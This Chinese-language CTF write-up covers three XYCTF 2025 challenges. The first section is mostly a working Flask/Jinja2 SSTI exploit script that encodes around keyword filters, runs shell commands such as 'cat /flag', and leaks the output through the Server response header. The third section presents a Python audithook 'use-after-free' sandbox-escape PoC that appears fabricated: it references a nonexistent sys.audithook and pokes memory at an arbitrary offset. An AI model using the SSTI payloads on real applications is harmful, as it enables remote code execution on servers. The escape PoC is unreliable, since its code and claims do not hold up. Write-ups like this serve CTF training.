# [XYCTF 2025] Now you see me 2
这是`Now you see me 1`的续作，环境更加苛刻，没有任何直接回显。我们需要找到一种方法来外带执行结果。

## 漏洞分析
核心的漏洞点仍然是Flask的SSTI，但是由于没有回显，我们需要利用其他方式将命令执行的结果带出来。
这里利用`werkzeug.serving.WSGIRequestHandler.server_version`，通过修改响应头中的`Server`字段，将我们想要的数据作为`Server`头的值来外带。

## 攻击流程
1.  **构造payload**:
    我们需要构造一个payload，通过SSTI修改`werkzeug.serving.WSGIRequestHandler.server_version`的值为我们命令执行的结果。
    因为大部分的关键字都被过滤了，所以payload的构造过程和`Now you see me 1`类似，通过`request.endpoint`和`request.data`来获取我们需要的字符。

2.  **外带数据**:
    我们可以通过`os.popen('whoami').read()`来执行命令并读取结果，然后将结果设置为`server_version`的值。
    ```python
    # 伪代码
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.server_version = os.popen('whoami').read()
    ```

3.  **发送请求并观察响应头**:
    发送构造好的请求后，查看返回的HTTP响应头，我们就可以在`Server`字段中看到命令执行的结果。

exp:
```python
import re
payload = []

def generate_rce_command(cmd):
    global payload
    payloadstr = "{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('werkzeug')|attr('serving')|attr('WSGIRequestHandler')|attr('__setattr__')('server_version',request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')()))%}"

    required_encoding = re.findall('\'([a-z0-9_ /\\.]+)\'', payloadstr)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    payload.append(fully_encoded_payload)
command = "cat /flag"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)
```

# [XYCTF 2025] greedymen
这是一道MISC题，基于"taxman game"。我们需要实现一个贪心算法来赢得游戏。

## 游戏规则
游戏规则大致是：
1.  从一堆数字中取出一个数字。
2.  这个数字的所有因子（除了它本身）如果还在数字堆里，也都会被拿走。
3.  玩家获得取出的数字，taxman获得所有被拿走的因子。
4.  目标是玩家的得分比taxman高。

## 解题思路
由于是贪心算法，我们需要在每一步都做出当前看起来最优的选择。
一个简单的贪心策略是：每次都选择能使自己得分最大化，同时让taxman得分最小化的数字。
我们可以遍历当前所有可选的数字，计算出如果选择这个数字，自己和taxman各能得多少分，然后选择差值最大的那个。

## 脚本
```python
def get_factors(n, numbers):
    factors = []
    for i in range(1, int(n**0.5) + 1):
        if n % i == 0:
            if i in numbers:
                factors.append(i)
            if n//i != i and n//i in numbers:
                factors.append(n//i)
    return factors

def taxman_game(numbers):
    player_score = 0
    taxman_score = 0
    
    while numbers:
        best_choice = -1
        max_diff = -float('inf')
        
        for num in numbers:
            factors = get_factors(num, numbers)
            player_gain = num
            taxman_gain = sum(factors)
            
            if player_gain > taxman_gain:
                diff = player_gain - taxman_gain
                if diff > max_diff:
                    max_diff = diff
                    best_choice = num

        if best_choice == -1:
            # No move is profitable, so taxman gets all remaining numbers
            taxman_score += sum(numbers)
            break
            
        player_score += best_choice
        factors_to_remove = get_factors(best_choice, numbers)
        taxman_score += sum(factors_to_remove)
        
        numbers.remove(best_choice)
        for factor in factors_to_remove:
            if factor in numbers:
                numbers.remove(factor)

    return player_score, taxman_score

# 示例
numbers_set = set(range(1, 101)) 
player, taxman = taxman_game(numbers_set)
print(f"Player score: {player}, Taxman score: {taxman}")
```
通过这个贪心策略，我们可以在游戏中获胜并得到flag。

# [XYCTF 2025] Lament Jail
这是一道复杂的MISC题，涉及到自定义的socket通信协议和Python沙箱逃逸。

## 题目分析
题目提供了一个需要进行socket通信的服务，通信协议是自定义的，包括了密码认证和RSA/AES密钥交换。我们需要先实现一个客户端来和服务器正常通信，然后再利用Python的UAF (Use-After-Free)漏洞来逃逸沙箱。

## 攻击流程
1.  **实现客户端**:
    首先需要逆向分析通信协议，实现一个Python客户端，能够处理密码认证和密钥交换，成功与服务器建立加密信道。

2.  **沙箱逃逸**:
    题目中的沙箱是基于`audithook`实现的。我们可以利用Python的UAF漏洞来绕过`audithook`的限制。
    在`LamentXU`师傅的博客中，提到了一个利用`audithook`的UAF漏洞的poc。
    ```python
    import sys
    import ctypes
    
    def hook(event, args):
        if event == 'sys._getframe':
            # Corrupt the last-resort hook
            ctypes.memset(id(sys.audithook) + 24, 0, 8)
    
    sys.addaudithook(hook)
    
    # Trigger the UAF
    sys._getframe()
    
    # Now we can do anything
    import os
    os.system('ls')
    ```
    我们需要将这个poc通过我们实现的客户端发送给服务器，在沙箱中执行，从而实现RCE。

## 总结
这道题综合考察了逆向工程、网络编程和pwn的知识，需要对Python的底层机制有较深的理解。成功与服务器建立通信是第一步，然后利用UAF漏洞逃逸沙箱，最终拿到flag。
